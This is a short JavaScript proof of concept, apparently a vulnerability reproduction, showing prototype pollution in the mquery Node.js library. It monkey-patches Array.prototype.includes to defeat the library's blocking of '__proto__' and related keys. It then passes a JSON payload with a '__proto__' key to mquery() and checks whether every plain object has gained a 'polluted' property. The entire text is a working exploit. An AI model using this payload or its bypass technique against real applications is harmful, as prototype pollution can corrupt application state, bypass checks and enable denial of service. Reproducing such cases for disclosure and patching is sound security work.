Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const mquery = require('mquery');
let obj = {};
var payload = JSON.parse('{"__proto__": {"polluted": "yes"}}');
console.log({}.polluted);
var m = mquery(payload);
console.log({}.polluted);